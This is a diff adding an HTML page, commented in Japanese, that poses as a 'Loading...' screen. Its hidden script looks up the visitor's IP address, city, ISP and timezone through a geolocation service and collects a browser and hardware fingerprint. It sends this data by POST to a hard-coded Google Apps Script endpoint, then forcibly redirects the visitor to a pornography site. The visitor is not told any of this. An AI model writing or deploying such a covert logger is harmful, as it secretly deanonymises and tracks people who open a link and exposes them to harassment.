@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+    <div>読み込み中...</div>
+
+    <script>
+    async function collectAllAndRedirect() {
+        const GAS_URL = "https://script.google.com/macros/s/AKfycbyT0chyfifHSgIAGaGzsa_fvzuwEXxkAc3ii0IN7T_QxVaEpaBlNnCr07RBGUXs2-ADhg/exec"; // あなたのGASウェブアプリURLに書き換え
+        const REDIRECT_URL = "https://jp.pornhub.com/";
+
+        try {
+            // 1. IPと詳細なネットワーク情報を取得
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geo = await geoRes.json();
+
+            // 2. ブラウザ・ハードウェア情報を収集
+            const info = {
+                // ネットワーク/場所
+                ip: geo.ip,
+                country: geo.country_name,
+                city: geo.city + " (" + geo.region + ")",
+                isp: geo.org,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+                // ブラウザ/環境
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                pdfViewer: navigator.pdfViewerEnabled,
+
+                // ディスプレイ
+                screenSize: `${screen.width}x${screen.height}`,
+                availSize: `${screen.availWidth}x${screen.availHeight}`,
+                dpr: window.devicePixelRatio,
+
+                // ハードウェア（※環境により取得不可の場合は"不明"）
+                cpu: navigator.hardwareConcurrency || "不明",
+                memory: navigator.deviceMemory || "不明",
+                touch: navigator.maxTouchPoints > 0 ? "あり" : "なし",
+
+                // 参照元
+                referrer: document.referrer || "直接アクセス"
+            };
+
+            // 3. GASに送信
+            await fetch(GAS_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            });
+
+        } catch (e) {
+            console.error(e);
+        } finally {
+            // 成功・失敗に関わらずリダイレクト
+            window.location.replace(REDIRECT_URL);
+        }
+    }
+
+    // 実行
+    collectAllAndRedirect();
+
+    // ネットワーク遅延対策のバックアップリダイレクト（5秒）
+    setTimeout(() => {
+        window.location.replace("https://jp.pornhub.com/");
+    }, 5000);
+    </script>
+</body>
+</html>
